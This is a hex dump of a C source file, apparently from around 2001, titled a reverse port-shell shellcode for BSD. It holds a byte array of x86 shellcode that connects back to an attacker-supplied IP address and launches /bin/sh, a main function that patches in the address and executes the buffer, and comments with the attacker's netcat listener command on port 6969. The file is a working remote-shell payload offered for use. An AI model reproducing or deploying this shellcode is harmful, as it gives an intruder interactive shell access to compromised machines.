00000000  2f 2a 20 72 65 76 65 72  73 65 2d 70 6f 72 74 73  |/* reverse-ports|
00000010  68 65 6c 6c 20 2a 42 53  44 20 73 68 65 6c 6c 63  |hell *BSD shellc|
00000020  6f 64 65 20 62 79 20 6e  6f 69 72 20 20 20 20 20  |ode by noir     |
00000030  20 20 2a 2f 0a 2f 2a 20  6c 6f 63 61 6c 20 75 73  |  */./* local us|
00000040  61 67 65 3a 20 2e 2f 72  65 76 65 72 73 65 2d 73  |age: ./reverse-s|
00000050  68 65 6c 6c 20 31 39 32  2e 31 36 38 2e 32 2e 33  |hell 192.168.2.3|
00000060  33 20 20 20 20 20 20 2a  2f 0a 2f 2a 20 72 65 6d  |3      */./* rem|
00000070  6f 74 65 3a 20 20 6e 63  20 2d 6e 20 2d 76 20 2d  |ote:  nc -n -v -|
00000080  76 20 2d 6c 20 2d 70 20  36 39 36 39 20 20 20 20  |v -l -p 6969    |
00000090  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 20 0a  |            */ .|
000000a0  2f 2a 20 6c 69 73 74 65  6e 20 6f 6e 20 36 39 36  |/* listen on 696|
000000b0  39 2f 74 63 70 09 09 09  09 20 20 2a 2f 0a 2f 2a  |9/tcp....  */./*|
000000c0  20 6e 6f 69 72 40 67 73  75 2e 6c 69 6e 75 78 2e  | noir@gsu.linux.|
000000d0  6f 72 67 2e 74 72 09 09  09 20 20 2a 2f 0a 0a 0a  |org.tr...  */...|
000000e0  63 68 61 72 20 73 68 65  6c 6c 63 6f 64 65 5b 5d  |char shellcode[]|
000000f0  20 3d 20 0a 7b 0a 20 20  30 78 33 31 2c 30 78 63  | = .{.  0x31,0xc|
00000100  39 2c 30 78 35 31 2c 30  78 34 31 2c 20 20 20 0a  |9,0x51,0x41,   .|
00000110  20 20 30 78 35 31 2c 30  78 34 31 2c 30 78 35 31  |  0x51,0x41,0x51|
00000120  2c 30 78 35 31 2c 0a 20  20 30 78 33 31 2c 30 78  |,0x51,.  0x31,0x|
00000130  63 30 2c 30 78 62 30 2c  30 78 36 31 2c 0a 20 20  |c0,0xb0,0x61,.  |
00000140  30 78 63 64 2c 30 78 38  30 2c 30 78 38 39 2c 30  |0xcd,0x80,0x89,0|
00000150  78 30 37 2c 0a 20 20 30  78 33 31 2c 30 78 63 39  |x07,.  0x31,0xc9|
00000160  2c 30 78 38 38 2c 30 78  34 66 2c 20 0a 20 20 30  |,0x88,0x4f, .  0|
00000170  78 30 34 2c 30 78 63 36  2c 30 78 34 37 2c 30 78  |x04,0xc6,0x47,0x|
00000180  30 35 2c 0a 20 20 30 78  30 32 2c 30 78 63 37 2c  |05,.  0x02,0xc7,|
00000190  30 78 34 37 2c 30 78 30  38 2c 0a 20 20 30 78 63  |0x47,0x08,.  0xc|
000001a0  30 2c 30 78 61 38 2c 30  78 30 31 2c 30 78 34 35  |0,0xa8,0x01,0x45|
000001b0  2c 20 2f 2f 69 70 61 64  64 72 0a 20 20 30 78 36  |, //ipaddr.  0x6|
000001c0  36 2c 30 78 63 37 2c 30  78 34 37 2c 30 78 30 36  |6,0xc7,0x47,0x06|
000001d0  2c 20 20 20 0a 20 20 30  78 31 62 2c 30 78 33 39  |,   .  0x1b,0x39|
000001e0  2c 30 78 36 61 2c 30 78  31 30 2c 0a 20 20 30 78  |,0x6a,0x10,.  0x|
000001f0  38 64 2c 30 78 34 37 2c  30 78 30 34 2c 30 78 35  |8d,0x47,0x04,0x5|
00000200  30 2c 20 20 0a 20 20 30  78 38 62 2c 30 78 30 37  |0,  .  0x8b,0x07|
00000210  2c 30 78 35 30 2c 30 78  35 30 2c 0a 20 20 30 78  |,0x50,0x50,.  0x|
00000220  33 31 2c 30 78 63 30 2c  30 78 62 30 2c 30 78 36  |31,0xc0,0xb0,0x6|
00000230  32 2c 20 20 20 0a 20 20  30 78 63 64 2c 30 78 38  |2,   .  0xcd,0x8|
00000240  30 2c 30 78 33 31 2c 30  78 63 39 2c 0a 20 20 30  |0,0x31,0xc9,.  0|
00000250  78 35 31 2c 30 78 38 62  2c 30 78 30 37 2c 30 78  |x51,0x8b,0x07,0x|
00000260  35 30 2c 20 20 20 0a 20  20 30 78 35 30 2c 30 78  |50,   .  0x50,0x|
00000270  33 31 2c 30 78 63 30 2c  30 78 62 30 2c 0a 20 20  |31,0xc0,0xb0,.  |
00000280  30 78 35 61 2c 30 78 63  64 2c 30 78 38 30 2c 30  |0x5a,0xcd,0x80,0|
00000290  78 34 31 2c 20 20 20 0a  20 20 30 78 38 33 2c 30  |x41,   .  0x83,0|
000002a0  78 66 39 2c 30 78 30 33  2c 30 78 37 35 2c 0a 20  |xf9,0x03,0x75,. |
000002b0  20 30 78 65 66 2c 30 78  33 31 2c 30 78 63 39 2c  | 0xef,0x31,0xc9,|
000002c0  30 78 35 31 2c 20 20 20  0a 20 20 30 78 35 31 2c  |0x51,   .  0x51,|
000002d0  30 78 33 31 2c 30 78 63  30 2c 30 78 62 30 2c 0a  |0x31,0xc0,0xb0,.|
000002e0  20 20 30 78 31 37 2c 30  78 63 64 2c 30 78 38 30  |  0x17,0xcd,0x80|
000002f0  2c 30 78 65 62 2c 20 20  20 0a 20 20 30 78 32 33  |,0xeb,   .  0x23|
00000300  2c 30 78 35 62 2c 30 78  38 39 2c 30 78 31 66 2c  |,0x5b,0x89,0x1f,|
00000310  0a 20 20 30 78 33 31 2c  30 78 63 39 2c 30 78 38  |.  0x31,0xc9,0x8|
00000320  38 2c 30 78 34 62 2c 20  20 20 0a 20 20 30 78 30  |8,0x4b,   .  0x0|
00000330  37 2c 30 78 38 39 2c 30  78 34 66 2c 30 78 30 34  |7,0x89,0x4f,0x04|
00000340  2c 0a 20 20 30 78 35 31  2c 30 78 38 64 2c 30 78  |,.  0x51,0x8d,0x|
00000350  30 37 2c 30 78 35 30 2c  20 20 20 0a 20 20 30 78  |07,0x50,   .  0x|
00000360  38 62 2c 30 78 30 37 2c  30 78 35 30 2c 30 78 35  |8b,0x07,0x50,0x5|
00000370  30 2c 0a 20 20 30 78 33  31 2c 30 78 63 30 2c 30  |0,.  0x31,0xc0,0|
00000380  78 62 30 2c 30 78 33 62  2c 20 20 20 0a 20 20 30  |xb0,0x3b,   .  0|
00000390  78 63 64 2c 30 78 38 30  2c 30 78 33 31 2c 30 78  |xcd,0x80,0x31,0x|
000003a0  63 39 2c 0a 20 20 30 78  35 31 2c 30 78 35 31 2c  |c9,.  0x51,0x51,|
000003b0  30 78 33 31 2c 30 78 63  30 2c 20 20 20 0a 20 20  |0x31,0xc0,   .  |
000003c0  30 78 62 30 2c 30 78 30  31 2c 30 78 63 64 2c 30  |0xb0,0x01,0xcd,0|
000003d0  78 38 30 2c 0a 20 20 30  78 65 38 2c 30 78 64 38  |x80,.  0xe8,0xd8|
000003e0  2c 30 78 66 66 2c 30 78  66 66 2c 20 20 20 0a 20  |,0xff,0xff,   . |
000003f0  20 30 78 66 66 2c 30 78  32 66 2c 30 78 36 32 2c  | 0xff,0x2f,0x62,|
00000400  30 78 36 39 2c 0a 20 20  30 78 36 65 2c 30 78 32  |0x69,.  0x6e,0x2|
00000410  66 2c 30 78 37 33 2c 30  78 36 38 2c 20 20 20 0a  |f,0x73,0x68,   .|
00000420  20 20 30 78 34 31 0a 7d  3b 0a 0a 0a 69 6e 74 20  |  0x41.};...int |
00000430  6d 61 69 6e 28 69 6e 74  20 61 72 67 63 2c 20 63  |main(int argc, c|
00000440  68 61 72 20 2a 2a 20 61  72 67 76 29 0a 7b 0a 20  |har ** argv).{. |
00000450  20 76 6f 69 64 20 28 2a  66 29 20 28 76 6f 69 64  | void (*f) (void|
00000460  29 3b 0a 20 20 75 6e 73  69 67 6e 65 64 20 69 6e  |);.  unsigned in|
00000470  74 20 64 3b 0a 0a 20 20  69 66 28 21 61 72 67 76  |t d;..  if(!argv|
00000480  5b 30 5d 29 0a 20 20 20  20 65 78 69 74 28 30 29  |[0]).    exit(0)|
00000490  3b 0a 0a 20 20 64 20 3d  20 69 6e 65 74 5f 61 64  |;..  d = inet_ad|
000004a0  64 72 28 61 72 67 76 5b  31 5d 29 3b 0a 20 20 70  |dr(argv[1]);.  p|
000004b0  72 69 6e 74 66 28 22 49  50 3a 20 25 6c 78 20 73  |rintf("IP: %lx s|
000004c0  68 65 6c 6c 63 6f 64 65  20 6c 65 6e 3a 20 25 64  |hellcode len: %d|
000004d0  5c 6e 22 2c 20 64 2c 20  73 74 72 6c 65 6e 28 73  |\n", d, strlen(s|
000004e0  68 65 6c 6c 63 6f 64 65  29 29 3b 0a 0a 0a 20 20  |hellcode));...  |
000004f0  73 68 65 6c 6c 63 6f 64  65 5b 32 38 5d 20 3d 20  |shellcode[28] = |
00000500  64 20 26 20 30 78 66 66  20 3b 0a 20 20 73 68 65  |d & 0xff ;.  she|
00000510  6c 6c 63 6f 64 65 5b 32  39 5d 20 3d 20 28 64 20  |llcode[29] = (d |
00000520  3e 3e 20 38 29 20 26 20  30 78 66 66 3b 0a 20 20  |>> 8) & 0xff;.  |
00000530  73 68 65 6c 6c 63 6f 64  65 5b 33 30 5d 20 3d 20  |shellcode[30] = |
00000540  28 64 20 3e 3e 20 31 36  29 20 26 20 30 78 66 66  |(d >> 16) & 0xff|
00000550  3b 0a 20 20 73 68 65 6c  6c 63 6f 64 65 5b 33 31  |;.  shellcode[31|
00000560  5d 20 3d 20 28 64 20 3e  3e 20 32 34 29 20 26 20  |] = (d >> 24) & |
00000570  30 78 66 66 3b 0a 0a 0a  20 20 66 20 3d 20 20 28  |0xff;...  f =  (|
00000580  76 6f 69 64 20 2a 29 20  73 68 65 6c 6c 63 6f 64  |void *) shellcod|
00000590  65 3b 0a 20 20 66 28 29  3b 0a 7d 0a 2f 2a 20 20  |e;.  f();.}./*  |
000005a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005b0  20 77 77 77 2e 68 61 63  6b 2e 63 6f 2e 7a 61 20  | www.hack.co.za |
000005c0  20 5b 32 30 20 6d 61 72  63 68 20 32 30 30 31 5d  | [20 march 2001]|
000005d0  2a 2f                                             |*/|
000005d2
